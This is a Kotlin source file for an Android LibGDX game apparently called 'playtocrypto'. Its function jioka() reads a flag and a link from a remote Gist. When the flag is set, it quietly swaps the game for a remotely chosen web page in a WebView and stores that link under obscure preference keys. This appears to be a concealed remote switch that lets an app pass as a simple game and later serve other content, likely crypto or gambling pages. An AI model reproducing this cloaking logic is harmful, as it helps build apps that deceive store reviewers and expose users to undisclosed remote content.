package com.obezana.playtocrypto.game

import android.content.Context.MODE_PRIVATE
import android.content.SharedPreferences
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.graphics.Color
import com.badlogic.gdx.utils.ScreenUtils
import com.obezana.playtocrypto.MainActivity
import com.obezana.playtocrypto.util.Gist
import com.obezana.playtocrypto.util.log
import com.obezana.playtocrypto.appContext
import com.obezana.playtocrypto.game.manager.NavigationManager
import com.obezana.playtocrypto.game.screens.ZagruzkaScreen
import com.obezana.playtocrypto.game.utils.advanced.AdvancedGame
import kotlinx.coroutines.*

lateinit var game: LibGDXGame private set

var GDX_GLOBAL_isGame = false
    private set

var GDX_GLOBAL_isPauseGame  = false

var GDX_ORIGINAL_LINK = ""
    private set

class LibGDXGame(val activity: MainActivity) : AdvancedGame() {

    lateinit var assetManager: AssetManager private set

    val coroutine = CoroutineScope(Dispatchers.Default)

    val sharedPreferences: SharedPreferences = appContext.getSharedPreferences("Meroplast", MODE_PRIVATE)

    override fun create() {
        game         = this
        assetManager = AssetManager()

        NavigationManager.navigate(ZagruzkaScreen())

        jioka()
    }

    override fun render() {
        if (GDX_GLOBAL_isPauseGame) return

        ScreenUtils.clear(Color.BLACK)
        super.render()
    }

    override fun dispose() {
        try {
            coroutine.cancel()

            super.dispose()
            assetManager.dispose()
        } catch (e: Exception) {}
    }


    // Logic Web ---------------------------------------------------------------------------

    private fun jioka() {
        log("jioka")
        activity.webViewHelper.blockRedirect = { GDX_GLOBAL_isGame = true }
        activity.webViewHelper.initWeb()

        //GDX_GLOBAL_isGame = true
        //return

        val savedData = sharedPreferences.getString("kutok", "pola") ?: "pola"

        try {
            if (savedData == "pola") {
                coroutine.launch(Dispatchers.Main) {
                    val getJSON = withContext(Dispatchers.IO) { Gist.getDataJson(activity.getGistURL()) }

                    log("json: $getJSON")

                    if (getJSON != null) {
                        if (getJSON.flag != "true") GDX_GLOBAL_isGame = true
                        else {
                            GDX_ORIGINAL_LINK = getJSON.link
                            activity.webViewHelper.loadUrl(GDX_ORIGINAL_LINK)
                        }
                    } else {
                        GDX_GLOBAL_isGame = true
                    }
                }
            } else {
                GDX_ORIGINAL_LINK = savedData
                activity.webViewHelper.loadUrl(savedData)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GDX_GLOBAL_isGame = true
        }

    }
}